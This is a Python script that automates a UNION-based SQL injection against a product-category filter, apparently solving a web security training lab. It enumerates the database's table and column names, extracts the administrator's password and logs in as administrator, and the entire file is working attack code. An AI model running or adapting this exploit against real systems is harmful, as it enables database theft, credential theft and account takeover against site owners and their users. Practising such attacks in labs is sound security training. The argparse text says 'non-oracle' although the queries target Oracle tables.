#!/usr/bin/python3

import requests
import sys
import urllib3
import argparse
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def perfom_request(url, sqli_payload):
    path = "/filter?category=Gifts"
    r = requests.get(url+path+sqli_payload, verify=False, proxies=proxies)
    return r.text

def sqli_users_table(url):
    sqli_payload = "' UNION SELECT NULL, table_name FROM all_tables--"
    response = perfom_request(url, sqli_payload)
    soup = BeautifulSoup(response, 'html.parser')
    users_table = soup.find(string=re.compile('^USERS\_.*'))
    if users_table:
        return users_table
    else:
        return False

def sqli_users_columns(url, users_table):
    sqli_payload = f"' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name = '{users_table}'--"
    response = perfom_request(url, sqli_payload)
    soup = BeautifulSoup(response, 'html.parser')
    username_column = soup.find(string=re.compile('.*USERNAME.*'))
    password_column = soup.find(string=re.compile('.*PASSWORD.*'))
    return username_column, password_column

def sqli_administrator_cred(url, users_table, username_column, password_column):
    sqli_payload = f"' UNION SELECT {username_column},{password_column} FROM {users_table}--"
    response = perfom_request(url, sqli_payload)
    soup = BeautifulSoup(response, 'html.parser')
    admin_password = soup.body.find(string="administrator").parent.find_next('td').contents[0]
    return admin_password

def get_csrf_token(sess, url):
    path_login = "/login"
    response = sess.get(url+path_login, verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def login_as_an_administrator(sess, url, admin_password):
    csrf = get_csrf_token(sess, url)
    path_login = "/login"
    data = {
        "csrf": csrf,
        "username": "administrator",
        "password": admin_password
    }
    response = sess.post(url+path_login, data=data, verify=False, proxies=proxies)
    if "Log out" in response.text:
        return True
    else:
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection Attack, listing the database contents on non-oracle databases")
    parser.add_argument("-u", "--url", help="Target URL(e.g., https://example.)")
    parser.add_argument("--proxy", help="Proxy URL (e.g.,http://127.0.0.1:8080)", default=None)

    args = parser.parse_args()

    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        print(f"[*] Using Proxy: {args.proxy}")

    print(f"[*] Looking for users table")
    users_table = sqli_users_table(args.url.strip())
    if users_table:
        print(f"[+] Found the users table name: {users_table}")
        username_column, password_column = sqli_users_columns(args.url.strip(), users_table)
        if username_column and password_column:
            print(f"[+] Found the username column name: {username_column}")
            print(f"[+] Found the password column name: {password_column}")

            admin_password = sqli_administrator_cred(args.url.strip(), users_table, username_column, password_column)
            if admin_password:
                print(f"[+] The administrator password is: {admin_password}")
                print(f"[*] Try to login as and Administrator")
                sess = requests.Session()
                if login_as_an_administrator(sess, args.url.strip(), admin_password):
                    print(f"[+] We have logged as and Administrator!")
                else:
                    print(f"[+] Did not login as an Administrator")
            else:
                print(f"[-] Did not find the administrator password")
        else:
            print(f"[-] Did not find username and/or password columns")
    else:
        print(f"[-] Did not find a users table")

        